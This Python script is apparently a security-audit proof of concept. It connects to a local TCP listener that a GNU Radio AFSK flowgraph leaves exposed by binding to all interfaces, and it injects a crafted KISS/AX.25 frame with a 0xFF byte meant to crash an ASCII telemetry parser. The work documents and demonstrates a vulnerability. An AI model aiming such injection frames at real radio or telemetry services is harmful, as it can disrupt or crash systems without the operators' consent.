#!/usr/bin/env python3
"""
F109 LAN-attacker analog.

Different process, same container. Connects to 127.0.0.1:52001 (where the
shipped afsk.grc flowgraph has bound thanks to host=''). Sends a single
locally-crafted KISS frame. No RF, no SDR, no out-of-band channel.

If this script's TCP connect succeeds, the listener is LAN-reachable.
That alone is the F109 proof. If the listener's downstream block
reports the bytes, the chain is end-to-end.
"""
import socket
import sys
import time


def craft_kiss_frame():
    """
    KISS framing per RFC: FEND CMD DATA... FEND
        FEND = 0xC0
        CMD  = 0x00 (data frame, port 0)
    Payload: a minimal AX.25 UI frame skeleton + a single non-ASCII byte
    (0xFF) so that if this byte reached a `construct.GreedyString('ascii')`
    parser (F18 class), it would raise UnicodeDecodeError. This is a
    locally crafted analog — afsk.grc TX path doesn't include
    telemetry_parser, so the byte exits as RF. But it proves the
    *content* is operator-controllable.
    """
    fend = 0xC0
    cmd = 0x00
    # AX.25 dest+src callsigns shifted-left + ctrl + PID + info
    payload = (
        b'\x9a\x60\xa6\x86\x40\x40\x60'   # dest 'MA00@@' shifted (placeholder)
        b'\x9a\x60\xa6\x86\x40\x40\x61'   # src  + last-addr flag
        b'\x03'                           # AX.25 UI control
        b'\xf0'                           # AX.25 PID 'no L3'
        b'CHAIN-F-LAN-INJECTION\xff'      # info — 0xff is the F18 trigger byte
    )
    return bytes([fend, cmd]) + payload + bytes([fend])


def main():
    host = '127.0.0.1'
    port = 52001
    frame = craft_kiss_frame()

    print('#' * 72)
    print('# F109/F110 — LAN attacker (separate process, same host)')
    print(f'# Target:  {host}:{port}  (bound by listener due to host="")')
    print(f'# Frame:   {len(frame)} bytes, KISS-framed AX.25 UI')
    print('#' * 72)

    # Retry briefly while the listener comes up
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)
    last_err = None
    for attempt in range(10):
        try:
            s.connect((host, port))
            print(f'[attacker] TCP connect SUCCEEDED on attempt {attempt+1}')
            break
        except (ConnectionRefusedError, OSError) as e:
            last_err = e
            time.sleep(0.5)
    else:
        print(f'[attacker] TCP connect FAILED after 10 attempts: {last_err}')
        return 2

    s.sendall(frame)
    print(f'[attacker] sent {len(frame)} bytes; hex='
          f'{frame.hex()[:64]}...')
    s.close()
    print('[attacker] socket closed; injection complete')
    print()
    print('#' * 72)
    print('# RESULT: pure-network injection — NO SDR, NO RF, NO AUDIO USED.')
    print('# If the listener process logs the frame, F109 is proven.')
    print('#' * 72)
    return 0


if __name__ == '__main__':
    sys.exit(main())
